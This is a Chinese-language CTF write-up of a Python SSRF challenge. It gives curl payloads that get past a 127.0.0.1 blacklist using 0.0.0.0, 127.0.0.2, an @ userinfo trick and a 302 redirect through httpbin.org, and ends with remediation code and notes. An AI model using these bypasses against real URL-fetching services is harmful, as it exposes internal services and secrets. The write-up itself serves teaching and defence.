---
title: "N1BOOK - Python里的SSRF（Claude × DS Pro 双路径版）"
date: 2026-09-11
categories:
  - CTF
  - WEB
---

# 1. 题目分析

**题目地址**：`http://20cf525c2a879b2bed3324a0.http-ctf2.dasctf.com/`

**题目提示**：尝试访问到容器内部的 8000 端口和 url path `/api/internal/secret` 即可获取 flag。

**初始访问**：

```bash
curl -s -i "http://20cf525c2a879b2bed3324a0.http-ctf2.dasctf.com/"
```

```
HTTP/1.1 200 OK
Server: openresty
Date: Fri, 11 Sep 2026 09:06:41 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 25
Connection: keep-alive
Cache-Control: no-cache

url parameter is required
```

**关键信息**：

| 线索 | 说明 |
|------|------|
| `Server: openresty` | 前端是 OpenResty（Nginx 系），通常做反向代理，后端另有服务 |
| `url parameter is required` | 应用接收一个 **`url` 参数**——典型的「URL 抓取代理」功能 |
| body 是纯文本无 HTML 包装 | Python Web 框架（Flask）风格 |

**推理**：`url` 参数 + 题目提示「访问容器内部 8000 端口」→ 后端是一个**可被 SSRF 利用的 URL 抓取接口**，flag 藏在同容器 8000 端口的 `/api/internal/secret` 上。

# 2. 信息收集

## 2.1 常见路径枚举

```bash
for p in "" index api robots.txt flag source app.py health; do
  printf "%-12s -> " "/$p"
  curl -s -o /dev/null -w "%{http_code}\n" "http://TARGET/$p"
done
```

```
/            -> 200
/index       -> 404
/api         -> 404
/robots.txt  -> 200   ← 有内容
/flag        -> 404
/source      -> 404
/app.py      -> 404
/health      -> 200
```

## 2.2 robots.txt 干扰项

```bash
curl -s "http://TARGET/robots.txt"
```

```
User-agent: *
Disallow: /static/secretkey.txt
```

直接访问 `/static/secretkey.txt` 返回 **404**——文件并不存在，这是**干扰项**，本题不需要。

## 2.3 通过 SSRF 探测内网指纹

用 `url` 参数作为探针打内网，报错信息把后端技术栈全部泄露出来：

```bash
# 内网 8000 端口的 404 页
curl -s -G --data-urlencode "url=http://0.0.0.0:8000/api/" "http://TARGET/"
```

```
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>404 Not Found</title>
<h1>Not Found</h1>
...
```

→ **Werkzeug/Flask 的 404 页面**，确认内网 8000 端口跑的是 Flask 应用。

```bash
# 内网 22 端口
curl -s -G --data-urlencode "url=http://127.0.0.2:22/" "http://TARGET/"
```

```
('Connection aborted.', BadStatusLine('SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2\r\n'))
```

→ 内网还开着 **SSH(22)**，系统是 **Debian 10**（旁路信息，本题用不上）。

```bash
# 外网请求回显自身 UA（httpbin 镜像）
curl -s -G --data-urlencode "url=http://httpbin.org/redirect/1" "http://TARGET/"
```

```json
{
  "args": {},
  "headers": {
    "Accept": "*/*",
    "Accept-Encoding": "gzip, deflate",
    "Host": "httpbin.org",
    "User-Agent": "python-requests/2.24.0",
    ...
```

→ 后端库确认为 **`requests/2.24.0`**（urllib3 栈），且**默认跟随了 302 重定向**（`/redirect/1` 返回的是最终页）——这两条指纹在后面路径 B 中直接决定了绕过方案。

# 3. 漏洞分析

## 3.1 SSRF 确认

```bash
curl -s -G --data-urlencode "url=http://example.com/" "http://TARGET/"
```

返回 `200 OK`，且 body 是 Example Domain 页面的完整 HTML。

**判定**：本地 curl 从未连接 example.com（没有 `-L`，服务端也返回 200 而非 302），页面内容是服务端**代取回显**的——「让服务器代替我们去发请求」，这就是 **SSRF**，且是**有回显型**（最好用的一类，直接当内网代理使）。

## 3.2 直球尝试与黑名单

按题目提示直接打内网：

```bash
curl -s -G --data-urlencode "url=http://127.0.0.1:8000/api/internal/secret" "http://TARGET/"
```

```
127.0.0.1 is forbidden
```

→ 存在 **SSRF 黑名单过滤**，目标是阻断对内网 loopback 的访问。主攻方向转为**绕过**。

## 3.3 推理链：过滤器到底在检查什么

**线索**：尝试多种「语义等价于 127.0.0.1」的写法，观察报错：

```bash
url=http://127.1:8000/...             → 127.0.0.1 is forbidden
url=http://localhost:8000/...         → 127.0.0.1 is forbidden
url=http://2130706433:8000/...        → 127.0.0.1 is forbidden   # 十进制整数形式
url=http://0x7f000001:8000/...        → 127.0.0.1 is forbidden   # 十六进制形式
url=http://0177.0.0.1:8000/...        → 127.0.0.1 is forbidden   # 八进制形式
url=http://127.0.0.1.nip.io:8000/...  → 127.0.0.1 is forbidden   # 通配 DNS
url=http://[::1]:8000/...             → [Errno -2] Name or service not known
```

**关键观察**：所有被拦请求的报错**都是统一的 `127.0.0.1`**，而不是输入原文（`127.1`、`2130706433`……）。

```
假设 1：字符串黑名单，匹配 "127.0.0.1"
  ↓ 验证：127.1 / 2130706433 / 0x7f000001 都不含该字符串，却全被拦 → 排除
假设 2：过滤器把 host 做了 DNS/数值解析归一化，再与 "127.0.0.1" 等值比较
  ↓ 验证：glibc gethostbyname() 恰好把所有上述写法归一化成 127.0.0.1，
          且报错回显的正是归一化结果 → 成立 ✅
```

过滤器逻辑可还原为：

```python
from urllib.parse import urlparse
import socket

host = urlparse(user_url).hostname      # 取 host
ip = socket.gethostbyname(host)         # 归一化成点分十进制
if ip == "127.0.0.1":                   # 精确等值比较！
    return "127.0.0.1 is forbidden"
```

**核心矛盾**：过滤器检查的是**归一化后的 IP**，而真正发起请求（`requests.get(url)`）用的是**原始 host 字符串**——两者之间的语义鸿沟就是绕过点。

## 3.4 路径 A：逆向过滤器，找「语义等价地址」（正面击破）

既然过滤器只做 `gethostbyname(host) == "127.0.0.1"` 的等值比较，那么只要找到一个「归一化结果 ≠ `127.0.0.1`，但实际连接仍落到本机」的地址即可。有两个现成的：

### A1. `0.0.0.0`（及同族 `0`、`0x0`）

```bash
curl -s -G --data-urlencode "url=http://0.0.0.0:8000/api/internal/secret" "http://TARGET/"
# → n1book{1132e28b5433c878}   ✅
```

```
攻击请求：http://0.0.0.0:8000/api/internal/secret
┌────────────────────────────────────────────────────────────┐
│ 1. hostname = "0.0.0.0"                                    │
│ 2. gethostbyname("0.0.0.0") = "0.0.0.0"                    │
│ 3. "0.0.0.0" == "127.0.0.1" ?  → False  → 检查通过 ✅        │
│ 4. requests.get("http://0.0.0.0:8000/...")                 │
│       ↓ Linux 内核 connect(0.0.0.0:8000)                   │
│   实际等价于 connect(127.0.0.1:8000)  ← 打回本机！           │
│ 5. Flask 8000 端口返回 flag                                 │
└────────────────────────────────────────────────────────────┘
```

同族写法全部成功：

```bash
url=http://0:8000/api/internal/secret    → n1book{...}   ✅
url=http://0x0:8000/api/internal/secret  → n1book{...}   ✅
```

### A2. `127.0.0.2`（127.0.0.0/8 整段回环）

```bash
curl -s -G --data-urlencode "url=http://127.0.0.2:8000/api/internal/secret" "http://TARGET/"
# → n1book{1132e28b5433c878}   ✅
```

Linux 中**整个 `127.0.0.0/8` 网段都绑定 lo 网卡**，不是只有 `127.0.0.1`。归一化结果 `127.0.0.2` ≠ `127.0.0.1`，通过等值检查；连接时内核照常路由回本机。

**路径 A 总结**：理解过滤器的实现 → 找实现盲区。优点是思路可迁移（任何「等值比较黑名单」都有这个缺陷）；缺点是依赖对 `gethostbyname` / 内核路由行为的了解，且环境一旦换成「网段判断 + `is_unspecified` 检查」就失效。

## 3.5 路径 B：绕开检查本身（@ host 归属 与 302 重定向链）

路径 B 不与过滤器比拼地址语义，而是从「检查这个环节本身」找盲区：**B1** 利用 URL 的 host 归属规则（`@` 前是 userinfo、之后才是 host）；**B2** 利用校验范围不完整（只检查初始 URL、不复查重定向的每一跳）。

### B1. `@` userinfo 技巧

URL 规范中 `@` 之前是 userinfo（用户名:密码），**不是 host**。`urlparse` 取 hostname 时看的是 `@` 之后的部分：

```bash
# 过滤器看到的 hostname = 0.0.0.0 → 通过；requests 连的也是 0.0.0.0 → 本机
curl -s -G --data-urlencode "url=http://127.0.0.1@0.0.0.0:8000/api/internal/secret" "http://TARGET/"
# → n1book{1132e28b5433c878}   ✅

# 反向验证：@ 之后是 127.0.0.1 → 被拦，证明 hostname 取的是 @ 之后的部分
curl -s -G --data-urlencode "url=http://0.0.0.0@127.0.0.1:8000/api/internal/secret" "http://TARGET/"
# → 127.0.0.1 is forbidden   ❌
```

```
http://127.0.0.1@0.0.0.0:8000/api/internal/secret
┌──────────┬──────────────────────────────────────┐
│          │                                      │
│ userinfo │  urlparse().hostname = "0.0.0.0"     │
│ 被忽略   │  检查对象 → 通过 ✅                    │
│          │                                      │
└──────────┴──────────────────────────────────────┘
   requests.get() 实际连接 0.0.0.0 → 本机 8000 → flag
```

### B2. 302 重定向链（校验范围缺陷：只查第一跳）

2.3 节已经拿到关键指纹：`requests.get()` **默认跟随重定向**（`allow_redirects=True`）。那么过滤器是「检查初始 URL」还是「检查每一跳」？构造一个外网可控的重定向服务来验证：

```bash
# 初始 URL 是 httpbin.org（合法）→ 302 → 127.0.0.1:8000（内网）
curl -s -G --data-urlencode "url=http://httpbin.org/redirect-to?url=http://127.0.0.1:8000/api/internal/secret" "http://TARGET/"
# → n1book{1132e28b5433c878}   ✅
```

```
http://httpbin.org/redirect-to?url=http://127.0.0.1:8000/api/internal/secret
        │
        ▼
过滤器检查 hostname = "httpbin.org"
        │  gethostbyname → 公网 IP，≠ 127.0.0.1
        ▼
检查通过 ✅ ──► requests.get(原 URL)
        │
        ▼
httpbin.org 返回 302 Location: http://127.0.0.1:8000/api/internal/secret
        │  allow_redirects=True（默认）→ requests 自动跟随
        ▼
GET http://127.0.0.1:8000/api/internal/secret   ← 过滤器【不再介入】！
        │
        ▼
    🚩 flag
```

**结论**：过滤器只在 `requests.get` 之前执行一次，重定向目标**完全不做复查**——本质是**校验范围不完整**（incomplete validation：只校验初始 URL、不覆盖后续每一跳）。

> **概念辨析：这不是 TOCTOU。** TOCTOU（CWE-367）要求「**同一个对象**先被检查、后被使用，攻击者在两次操作之间的时间窗里**把它换掉**」——本质是竞态。本场景三条只满足一条：检查的是 URL①（httpbin.org），真正打到内网的是 URL②（`127.0.0.1`）——**URL② 从未进入检查范围**，不存在「被换掉」的对象，302 也是确定性触发（无竞态）。SSRF 语境下真正符合 TOCTOU 的是 **DNS Rebinding**（同一域名在检查与请求之间被换掉解析结果，见 7.2 修复建议第 3 条）；两者是兄弟概念而非同一概念：B2 是**校验范围覆盖不到**（遗漏），TOCTOU 是**同一对象被掉包**（竞态）。修复也因此不同：B2 要补全检查范围（每跳复查/禁止跟随），TOCTOU 要消灭检查与使用之间的第二次解析。

**路径 B 总结**：不与过滤器正面交锋，而是利用「检查」与「使用」之间的不一致。B1 依赖 URL 的 host 归属规则，B2 依赖**校验范围不完整**（只校验初始 URL、不复查重定向的每一跳）。两条都更接近通用 SSRF 绕过思想，不依赖目标系统的具体解析行为。

## 3.6 双路径对比

| 维度 | 路径 A（过滤器逆向） | 路径 B（绕开检查本身） |
|------|---------------------|---------------------|
| 核心思路 | 理解过滤器 → 找实现盲区 | 从「检查」本身找盲区（host 归属规则 / 校验范围） |
| 需要的前置信息 | 归一化行为（黑盒测试反推） | `urlparse` / `requests` 的公开行为 |
| 具体手法 | `0.0.0.0` / `0` / `0x0` / `127.0.0.2` | `@` userinfo、302 重定向链 |
| 通用性 | 强（等值黑名单通病），但环境换判断逻辑即失效 | 强，`@` 技巧对几乎所有「取 hostname 比对」的过滤器有效；重定向链对几乎所有「只查第一跳」的过滤器有效 |
| 额外依赖 | 无（不需要外网） | B2 需要**出网 egress** + 一个可控的外部重定向服务（本题恰好有） |
| 失败风险点 | 若过滤器改用 `ipaddress.is_loopback` 网段判断则失效 | 若 `allow_redirects=False` 或每跳复查则 B2 失效；B1 对「禁 `@`」的正则过滤失效 |

**两者不是竞争关系，而是互补**：路径 A 教我们「黑名单为什么挡不住」，路径 B 教我们「检查的覆盖范围之外还有什么」。实战中两条链同时走，成功率最高。

# 4. 漏洞利用

## 4.1 最小 PoC（路径 A）

```bash
curl -s -G --data-urlencode "url=http://0.0.0.0:8000/" "http://TARGET/"
# → url parameter is required   ← SSRF 已打回本机 8000（该服务的首页文案）
```

## 4.2 三种最终 Payload

```bash
TARGET="http://20cf525c2a879b2bed3324a0.http-ctf2.dasctf.com"

# ① 路径 A：0.0.0.0（内核路由回本机）
curl -s -G --data-urlencode "url=http://0.0.0.0:8000/api/internal/secret" "$TARGET/"

# ② 路径 B1：@ userinfo
curl -s -G --data-urlencode "url=http://127.0.0.1@0.0.0.0:8000/api/internal/secret" "$TARGET/"

# ③ 路径 B2：302 重定向链
curl -s -G --data-urlencode "url=http://httpbin.org/redirect-to?url=http://127.0.0.1:8000/api/internal/secret" "$TARGET/"
```

三者输出均为：

```
n1book{1132e28b5433c878}
```

# 5. Flag

```
n1book{1132e28b5433c878}
```

获取方式：通过 `url` 参数发起 SSRF，绕过 `127.0.0.1` 黑名单（`0.0.0.0` 语义等价地址 / `@` userinfo / 302 重定向链），请求容器内 8000 端口的 `/api/internal/secret` 接口。

# 6. 尝试过但失败的路径

| 尝试 | 预期 | 实际结果 | 得到的结论 |
|------|------|---------|-----------|
| `?url=http://example.com/` | 回显被抓取内容 | 成功回显 | **SSRF 确认**（唯一入口） |
| `?url=http://127.0.0.1:8000/api/internal/secret` | 拿到 flag | `127.0.0.1 is forbidden` | 存在黑名单过滤，转向绕过 |
| `?url=http://127.1:8000/...` | 绕过字符串黑名单 | 同样被拦 | 过滤器做了**归一化**，不是字符串匹配 |
| `?url=http://localhost:8000/...` | 绕过 | 同样被拦 | DNS 名称也会被解析归一化 |
| `?url=http://2130706433:8000/...`（十进制） | 绕过 | 同样被拦 | 整数形式归一化后仍是 127.0.0.1 |
| `?url=http://0x7f000001:8000/...`（十六进制） | 绕过 | 同样被拦 | 同上 |
| `?url=http://0177.0.0.1:8000/...`（八进制） | 绕过 | 同样被拦 | 同上 |
| `?url=http://127.0.0.1.nip.io:8000/...` | DNS 解析绕过 | 同样被拦 | 过滤发生在 DNS 解析**之后** |
| `?url=http://[::1]:8000/...` | IPv6 绕过 | `[Errno -2] Name or service not known` | 容器未启用 IPv6 解析 |
| `?url=http://0.0.0.0@127.0.0.1:8000/...` | 验证 @ 技巧方向 | `127.0.0.1 is forbidden` | 证明 `urlparse().hostname` 取的是 **@ 之后**的部分（反向验证 B1 成立） |
| `?url=file:///etc/passwd` | 任意文件读取 | `empty hostname` | 代码强制要求 hostname，`file://` 等无主机协议被排除（符合提示：不读本地文件） |
| 直接访问 `/static/secretkey.txt` | robots.txt 指向的密钥 | **404** | 干扰项，文件不存在 |
| `?url=http://0.0.0.0:8000/api/` | 探测内网 8000 | Werkzeug 404 页 | 内网 8000 是 Flask 应用 |
| `?url=http://127.0.0.2:22/` | 探测 SSH | `SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2` | 22 端口开放，Debian 10（旁路信息） |
| **`?url=http://0.0.0.0:8000/api/internal/secret`** | **路径 A 绕过** | **`n1book{...}`** | ✅ 成功 |
| **`?url=http://127.0.0.1@0.0.0.0:8000/api/internal/secret`** | **路径 B1 绕过** | **`n1book{...}`** | ✅ 成功 |
| **`?url=http://httpbin.org/redirect-to?url=http://127.0.0.1:8000/...`** | **路径 B2 绕过** | **`n1book{...}`** | ✅ 成功 |

**排除法的价值**：`127.1`、`2130706433`、`0x7f000001`、`localhost` 被统一报告为 `127.0.0.1` → 反推出归一化步骤存在；`@` 双向实验 → 反推出 hostname 取 `@` 之后；`file://` 报 `empty hostname` → 反推出协议带 hostname 强校验。**每一条失败都在刻画过滤器的真实实现。**

# 7. 知识点总结

## 7.1 技术点

### ① Python host 归一化行为（`gethostbyname` / `inet_aton`）

| 输入 | 归一化结果 |
|------|-----------|
| `127.0.0.1` | `127.0.0.1` |
| `127.1` | `127.0.0.1` |
| `2130706433` | `127.0.0.1` |
| `0x7f000001` | `127.0.0.1` |
| `0177.0.0.1` | `127.0.0.1` |
| `localhost` | `127.0.0.1` |
| **`0.0.0.0` / `0` / `0x0`** | **`0.0.0.0`** ← 不在黑名单内！ |
| **`127.0.0.2`** | **`127.0.0.2`** ← 不在黑名单内，但仍是本机！ |

### ② `0.0.0.0` 的双重身份

- 作为**监听地址**：表示「监听本机所有网卡」。
- 作为**连接目标**：Linux 上 `connect(0.0.0.0:port)` 被内核路由回本机 loopback，等价于连 `127.0.0.1`。
- 作为**过滤值**：只写 `127.0.0.1` 的黑名单几乎都漏掉它。

### ③ `127.0.0.0/8` 整段回环

Linux 中 `127.0.0.0/8` 全部绑定 `lo` 网卡，`127.0.0.2` ~ `127.0.0.254` 都能访问本机服务——「只有 127.0.0.1 是本机」是常见误解。

### ④ URL 解析差异：`@` 与 userinfo

`urlparse("http://a@b/").hostname` → `"b"`。`@` 之前的部分是 userinfo，绝大多数客户端在建立连接时忽略它。过滤器若与请求库「取 host」的规则一致（都取 `@` 后），则 `@` 本身不构成绕过；但若过滤器用**正则匹配整个字符串**而请求库按标准解析，`127.0.0.1@anything` 就能骗过正则。本题过滤器用的是 `urlparse`，所以 `@` 技巧的实质是把 hostname 从 `127.0.0.1` 换成 `0.0.0.0`——与路径 A 殊途同归。

### ⑤ 重定向跟随 = 校验范围不完整（注意：不是 TOCTOU）

`requests.get(url)` 默认 `allow_redirects=True`，而过滤逻辑只在请求发起前对**初始 URL** 执行一次：第一跳合法即放行，**后续每一跳都不在检查范围内**。这不是 TOCTOU——TOCTOU 是同一对象在检查与使用之间被掉包（竞态），这里是被检查范围之外的第二个对象从未受检，两者是兄弟概念。修复：每一跳都重新校验，或直接 `allow_redirects=False`。

### ⑥ 报错回显是最强的信息源

- `127.0.0.1 is forbidden`（统一归一化结果）→ 暴露过滤器的比较对象
- `HTTPConnectionPool(...)` / `Read timed out` → 暴露 requests/urllib3 栈
- httpbin 回显的 `User-Agent: python-requests/2.24.0` → 暴露库与版本
- Werkzeug 404 / SSH banner → 暴露内网服务指纹

## 7.2 修复建议

```python
import ipaddress, socket
from urllib.parse import urlparse

ALLOWED_SCHEMES = {"http", "https"}

def safe_fetch(user_url):
    u = urlparse(user_url)

    # 1. 协议白名单 + hostname 强校验
    if u.scheme not in ALLOWED_SCHEMES or not u.hostname:
        raise ValueError("invalid url")

    # 2. 解析所有 A/AAAA 记录，逐条用 ipaddress 模块判断（不是字符串等值！）
    for _, _, _, _, sockaddr in socket.getaddrinfo(u.hostname, None):
        ip = ipaddress.ip_address(sockaddr[0])
        if (ip.is_loopback or ip.is_private or ip.is_link_local
                or ip.is_multicast or ip.is_reserved or ip.is_unspecified):
            raise ValueError(f"{ip} is forbidden")

    # 3. 关键修复点：
    #    a. 关闭重定向跟随（或对每一跳重新走上面的校验）
    #    b. 用【已校验的 IP】发起请求（固定 IP + Host 头），杜绝 DNS Rebinding
    #    c. 回显脱敏，不把异常原文吐给客户端
    return requests.get(user_url, timeout=2, allow_redirects=False)
```

**要点**：
1. `ipaddress` 的 `is_loopback` / `is_unspecified` 属性判断，一次堵死 `0.0.0.0` 和整个 `127/8`。
2. `allow_redirects=False`（或每跳复查），堵死 302 链。
3. 校验后**固定 IP 再请求**，堵死 DNS Rebinding——同一域名在校验与请求两个时刻被解析两次，攻击者在间隙把解析结果从公网 IP 换成内网 IP，这才是**真正的 TOCTOU**（竞态：把检查写得更严没有用，必须消灭第二次解析）。
4. 网络层兜底：iptables / 独立 netns 限制出站，别让应用层过滤当唯一防线。

# 8. 解题链路总结图

```
                    GET / → "url parameter is required"
                                  │
                        发现 ?url= 抓取接口
                                  │
                    url=http://example.com → 回显页面
                                  │
                           ✅ SSRF 确认（回显型）
                                  │
                    url=http://127.0.0.1:8000/api/internal/secret
                                  │
                          ❌ "127.0.0.1 is forbidden"
                                  │
                    多种等价写法全部被拦，且报错统一为
                    "127.0.0.1" → 反推出【归一化+等值比较】
                                  │
                ┌─────────────────┴─────────────────┐
                │                                   │
     路径 A：正面击破过滤器                   路径 B：绕开检查本身
     （找语义等价地址）                      （host 归属规则 / 校验范围）
                │                                   │
     gethostbyname ≠ 127.0.0.1            ┌─────────┴─────────┐
     但实际连回本机的地址                  │                   │
                │                   B1: @ userinfo     B2: 302 重定向链
     ┌──────────┼──────────┐        ┌─────────┐         ┌─────────┐
     │          │          │        │127.0.0.1│         │httpbin  │
  0.0.0.0     127.0.0.2     0      │@0.0.0.0 │         │redirect │
   (0x0)   (127/8 整段)  (整数)    │hostname │         │-to?url= │
     │          │          │        │=0.0.0.0 │         │127...   │
     └──────────┼──────────┘        │→ 通过   │         │→ 通过   │
                │                   │         │         │         │
                ▼                   ▼         ▼         ▼         ▼
        url=http://0.0.0.0:8000/api/internal/secret
        （或 @ 变体 / 302 链变体，任选其一）
                                  │
                                  ▼
                        🚩 n1book{1132e28b5433c878}
                                  │
                                  ▼
                  溯源根因：过滤器只做 ip == "127.0.0.1"
                  等值比较 + 校验范围不完整（只查初始 URL、
                  重定向每跳不复查——非 TOCTOU），
                  未用 ipaddress.is_loopback 网段判断，
                  遗漏 0.0.0.0 与整个 127/8
```

## 一句话总结

> **黑名单过滤器只做 `gethostbyname(host) == "127.0.0.1"` 的等值比较，于是「归一化后不是 127.0.0.1、但实际仍连回本机」的地址（`0.0.0.0`、`127/8`）与「检查和使用之间不一致」的缝隙（`@` userinfo、302 重定向链）双双成了绕过点——两路夹击，任取其一即得 flag。**

---

## 附：问答记录

**Q**（2026-09-14）：利用命令中的 `http://httpbin.org/redirect-to?url=...` 是什么意思？

**A**：`httpbin.org` 是公网上的 **HTTP 测试 / 回显服务**（requests 库作者 Kenneth Reitz 开发，Flask 实现），专门用来调试 HTTP 客户端。`/redirect-to` 是它的一个端点，行为只有一句话：

> **读取自己的 `url` 查询参数，原样写进 `Location` 响应头，返回 302。** 它自己不会去抓取目标内容，只负责「指路」——相当于一个**公网可控的重定向跳板**。

本机直连验证：

```bash
curl -s -i "http://httpbin.org/redirect-to?url=http://example.com/" | head -5
```

```
HTTP/1.1 302 FOUND
Location: http://example.com/     ← url 参数原样进了 Location 头
```

在本题中的作用：把「靶机真正要抓的 URL」拆成两跳，过滤器只检查第一跳的 hostname：

```
靶机请求 ① http://httpbin.org/redirect-to?url=http://127.0.0.1:8000/api/internal/secret
              过滤器检查 hostname = "httpbin.org" → 公网 IP → 通过 ✅
              ↓ httpbin 返回 302，Location: http://127.0.0.1:8000/api/internal/secret
              ↓ requests 默认 allow_redirects=True 自动发第二跳（过滤器不复查）──► 🚩
```

其他常用端点（SSRF / 调试场景速查）：`/get`、`/post` 回显请求内容；`/ip` 回显请求方的出口 IP；`/headers` 回显请求头；`/redirect/n` 302 跳 n 次后落到 `/get`；`/delay/n` 延迟 n 秒返回。实战中重定向跳板可替换为：自己的 VPS（最可靠）、任意站点的开放重定向（open redirect）、短链服务等——前提是**靶机具备出网能力**。

---

**Q**（2026-09-14）：TOCTOU 必须满足「检查的对象和使用对象是**同一个**路径/资源、中间有**时间差**、攻击者在间隙**换掉**它」——B2 的 302 重定向链真的符合吗？

**A**：不符合。原稿在 B2 与 7.1⑤ 处把「重定向跟随」标注为 TOCTOU 属于术语误用，已全文修正。逐条对照三要件：

| 要件 | 真正的 TOCTOU（SSRF 场景 = DNS Rebinding） | B2 的 302 链 |
|------|--------------------------------------------|--------------|
| 同一对象 | ✅ 同一个域名（同一标识符） | ❌ 检查的是 URL①（httpbin.org），真正打到内网的是 URL②（`127.0.0.1`）——URL② **从未进入检查范围** |
| 时间差 | ✅ 检查时刻 vs 使用时刻 | ✅ 确实存在（**只有这一条吻合**） |
| 间隙替换 | ✅ 攻击者在两次 DNS 解析之间把应答从公网 IP 换成内网 IP（本质是竞态，CWE-367 隶属竞态类 CWE-362） | ❌ 没有「替换」动作：302 是**确定性**触发，不依赖时序，也不存在被掉包的中间对象 |

→ B2 的正确称呼是**校验范围不完整**（incomplete validation，只校验第一跳）：被利用的不是「对象被换掉」，而是「第二个对象根本没被检查」。它与 TOCTOU 是**兄弟概念**——共同点仅是「检查先于使用」；区别：TOCTOU = 同一对象被掉包（竞态），B2 = 检查范围覆盖不到（遗漏）。两者表面现象相似（「检查时一个样、使用时另一个样」），这正是最容易被混为一谈的原因。

修复也因此分属两招：B2 → `allow_redirects=False` 或**每一跳重新校验**（把检查范围补全）；TOCTOU / DNS Rebinding → **校验后固定解析到的 IP、用该 IP 直连**（消灭检查与使用之间的第二次解析——对竞态，把检查写得更严没用，必须消除间隙）。


